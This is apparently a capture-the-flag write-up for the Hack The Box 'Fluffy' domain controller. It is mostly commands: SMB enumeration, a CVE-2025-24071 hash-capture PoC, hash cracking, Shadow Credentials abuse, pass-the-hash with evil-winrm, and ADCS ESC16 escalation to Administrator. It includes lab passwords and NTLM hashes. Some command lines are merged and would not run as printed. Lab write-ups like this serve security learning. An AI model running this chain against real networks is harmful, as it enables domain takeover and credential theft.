## Enumeration

- I started by performing a full TCP port scan using `nmap`, followed by a version and service detection scan on the identified open ports:

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.11.69 -oG scan
	/opt/extractports scan
	nmap -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49685,49690,49701,49718 -Pn -sCV 10.10.11.69 -oN ports
	```
	
	<img width="1514" height="904" alt="image" src="https://github.com/user-attachments/assets/14cb31f3-b781-4c88-8f79-7f62722d5ce5" />

- From the enumeration, I discovered the domain `fluffy.htb` and the hostname `DC01.fluffy.htb`, which I added to my `/etc/hosts` file.

## Initial Access (SMB Enumeration)

- Hack The Box provided initial credentials:

	```python
	Username: j.fleischman  
	Password: J0elTHEM4n1990!
	```

- Using `netexec`, I enumerated accessible SMB shares:

	```python
	netexec smb 10.10.11.69  -u j.fleischman -p 'J0elTHEM4n1990!' --shares
	```

- The share named `IT` was accessible. I mounted it using `smbclient`:

	```python
	smbclient -U 'j.fleischman' //10.10.11.69/IT
	```

- Inside the share, there was a file named `Upgrade_Notice.pdf`, which mentioned two critical CVEs: CVE-2025-24071 and CVE-2025-24996.

### Exploiting CVE-2025-24071

- Using a PoC from [this repository](https://github.com/0x6rss/CVE-2025-24071_PoC), I crafted a malicious ZIP file and uploaded it to the `IT` share. Upon extraction, an NTLMv2 hash was captured from the user `p.agila`.

- I cracked the hash using `hashcat`:

	```python
	hashcat hash_poc /usr/share/wordlists/rockyou.txt 
	```

## Active Directory Enumeration

- Using the initial credentials, I ran BloodHound collection:

	```python
	bloodhound-python -c all -u 'j.fleischman' -p 'J0elTHEM4n1990!' -ns 10.10.11.69 -d fluffy.htb
	```

- Analysis showed that the user `p.agila` was a member of the `Service account managers` group, which had `GenericAll` rights over the `Service accounts` group. The latter had `GenericWrite` over three users: `ca_svc`, `ldap_svc`, and `winrm_svc`.

	<img width="1106" height="355" alt="image" src="https://github.com/user-attachments/assets/cc08d049-085d-4ae9-9545-245a9c775e36" />

- I added `p.agila` to the `Service accounts` group using:

	```python
	net rpc group addmem "service accounts" "p.agila" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
	```

## Shadow Credentials Attack

- I leveraged the [Shadow Credentials attack](https://github.com/ly4k/Certipy/wiki/03.-Shadow-Credentials) to retrieve NTLM hashes from the target service accounts:

	```python
	ntpdate 10.10.11.69 certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -dc-ip 10.10.11.69 -account ca_svc
	```

The hashes obtained:
- `ca_svc`: `ca0f4f9e9eb8a092addf53bb03fc98c8`
- `ldap_svc`: `22151d74ba3de931a352cba1f9393a37`
- `winrm_svc`: `33bd09dcd697600edf6b3a7af4875767`

- Using `evil-winrm`, I gained access to the box as `winrm_svc`:

	```python
	evil-winrm -i 10.10.11.69 -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
	```

- his granted me access to the user flag.

## ADCS Exploitation (ESC16)

- After upgrading `certipy-ad`, I enumerated certificate templates using the hash of `ca_svc`:

	```python
	certipy-ad find -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -stdout -enabled -vulnerable
	```

- One of the templates was vulnerable to [ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation). I modified the UPN for `ca_svc` to impersonate the Administrator:

	```python
	certipy-ad account update -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -user ca_svc -upn 'administrator'
	```

- Then I requested a certificate and authenticated as Administrator:

	```python
	rdate -n 10.10.11.69 certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -account ca_svc export KRB5CCNAME=ca_svc.ccache certipy-ad req -k -dc-ip 10.10.11.69 -target DC01.fluffy.htb -ca fluffy-DC01-CA -template User
	```

- Finally, I authenticated with the certificate:

	```python
	certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -username administrator -domain fluffy.htb
	```

- Then accessed the machine with full administrative privileges:

	```python
	evil-winrm -i 10.10.11.69 -u Administrator -H <admin_hash>
	```
